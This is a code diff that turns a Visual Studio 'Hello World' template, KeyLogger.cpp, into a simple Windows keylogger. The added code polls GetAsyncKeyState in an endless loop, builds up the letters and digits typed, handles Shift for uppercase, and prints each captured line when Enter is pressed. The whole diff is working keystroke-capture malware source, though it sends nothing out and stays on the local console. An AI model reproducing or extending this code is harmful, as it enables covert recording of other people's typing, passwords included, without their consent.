@@ -1,11 +1,56 @@
 // KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
-
+#include <Windows.h>
 #include <iostream>
+#include <cstdlib>
+using namespace std;
+
+
+
+bool isNum(DWORD value) {
+	if (value >= 0x30 && value <= 0x39)
+		return true;
+	return false;
+}
+string currentSentence = "";
+void findLetterTyped() {
+
+	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
+	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+
+	DWORD word = 0x30;
+	for (int i = 0; i < 43; i++) {
+		if ((GetAsyncKeyState(word) & 1)) { //Loops through every single letter until it finds the one with the least bit number changed 
+
+			if (isNum(word)) {
+				currentSentence += numbers[i];
+			}else if (GetAsyncKeyState(VK_SHIFT)) { //Deals with Uppercase letters
+
+				currentSentence+=toupper(alphabet[abs(42 - i - 26 + 1)]);
+			}
+			else {
+				currentSentence += alphabet[abs(42-i-26+1)];
+			}
+			
+		}
+
+		word++;
+		if (GetAsyncKeyState(VK_RETURN) & 1) {
+			cout << currentSentence << endl;
+			currentSentence = "";
+			return;
+		}
+	}
+
+}
+
 
 int main()
 {
-    std::cout << "Hello World!\n"; 
+	while (1) {
+		Sleep(1);
+		findLetterTyped();
+	}
 }
 
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
